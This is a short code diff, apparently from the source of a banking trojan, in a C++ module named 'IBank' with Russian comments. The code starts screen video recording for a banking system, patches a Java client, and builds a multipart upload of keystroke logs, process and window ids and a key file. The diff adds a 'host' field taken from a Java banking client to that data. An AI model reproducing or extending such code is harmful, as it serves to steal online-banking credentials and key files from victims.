@@ -273,6 +273,7 @@ namespace IBank
 			JavaPatcherSignal();
 		#endif
 
+
 		// Запускаем запись видео
 		VideoRecorderSrv::StartRecording(SystemName);
 
@@ -392,6 +393,12 @@ namespace IBank
 		MultiPartData::AddStringField(Data, "keyhwnd",  Log->Log);
 		MultiPartData::AddLongAsStr(Data,   "pid",  Log->PID);
 		MultiPartData::AddLongAsStr(Data,   "hwnd", (DWORD)Log->Wnd);
+
+		#ifdef JavaClient2015SaverH
+			string Host = GetJavaClient2015HkstName();
+			if (!Host.IsEmpty())
+                MultiPartData::AddStringField(Data, "host",  Host.t_str());
+		#endif
 
 
 		if (Log->KeyFile != NULL)
